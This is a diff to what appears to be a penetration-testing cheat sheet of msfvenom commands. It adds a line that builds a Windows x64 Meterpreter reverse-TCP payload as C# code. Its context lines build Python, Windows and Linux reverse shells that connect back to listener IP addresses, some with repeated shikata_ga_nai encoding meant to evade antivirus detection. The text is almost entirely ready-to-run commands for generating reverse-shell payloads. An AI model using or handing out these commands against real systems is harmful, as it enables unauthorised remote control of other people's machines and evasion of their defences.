@@ -5,6 +5,9 @@ msfvenom -p python/meterpreter/reverse_tcp LHOST=34.213.170.51 LPORT=4444 -f raw
 # windows reverse meterpreter
 msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 50 LHOST=192.168.1.103 LPORT=4444 -f exe > mns.exe
 
+## csharp
+msfvenom -a x86_64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.52.130 LPORT=4444 -f csharp	
+
 # linux reverse shell
 msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=10.192.166.14 LPORT=4444 -e x86/shikata_ga_nai -i 50 -b "\x00" -f elf > linux_shell.elf
 
